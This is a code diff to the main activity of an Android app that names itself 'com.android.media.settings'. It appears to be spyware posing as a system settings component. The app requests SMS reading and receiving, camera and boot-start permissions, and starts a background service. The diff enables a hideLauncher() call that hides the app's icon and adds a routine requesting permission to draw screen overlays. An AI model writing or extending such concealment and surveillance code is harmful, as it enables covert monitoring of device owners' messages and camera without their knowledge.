@@ -1,13 +1,16 @@
 package com.android.media.settings;
 
 import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.support.annotation.NonNull;
 import android.util.Log;
 import android.view.View;
@@ -79,12 +82,24 @@ public class MainActivity extends Activity {
                         Manifest.permission.READ_SMS,
                         Manifest.permission.RECEIVE_SMS,
                         Manifest.permission.CAMERA,
-                        Manifest.permission.RECEIVE_BOOT_COMPLETED
+                        Manifest.permission.RECEIVE_BOOT_COMPLETED,
                 }, REQ_CODE_ASK_PERMS);
                 return;
             }
         }
+        //addOverlay();
         startService();
+    }
+
+    public static int OVERLAY_PERMISSION_CODE = 2525;
+
+    @TargetApi(23)
+    public void addOverlay() {
+        if (!Settings.canDrawOverlays(this)) {
+            Log.d(TAG, getPackageName());
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
+        }
     }
 
     public void checkAndStartService() {
@@ -96,7 +111,7 @@ public class MainActivity extends Activity {
     private void startService() {
         Log.d(TAG, "On Start Service : " + MediaService.class);
         checkAndStartService();
-        //hideLauncher();
+        hideLauncher();
     }
 
     private void hideLauncher() {
@@ -147,6 +162,10 @@ public class MainActivity extends Activity {
                     Toast.makeText(this, "Please provide permission", Toast.LENGTH_SHORT).show();
                     checkPerms();
                 }
+                break;
+
+            case 1234:
+                Log.d("TAG", "ON Window Manager Permission");
                 break;
 
             default:
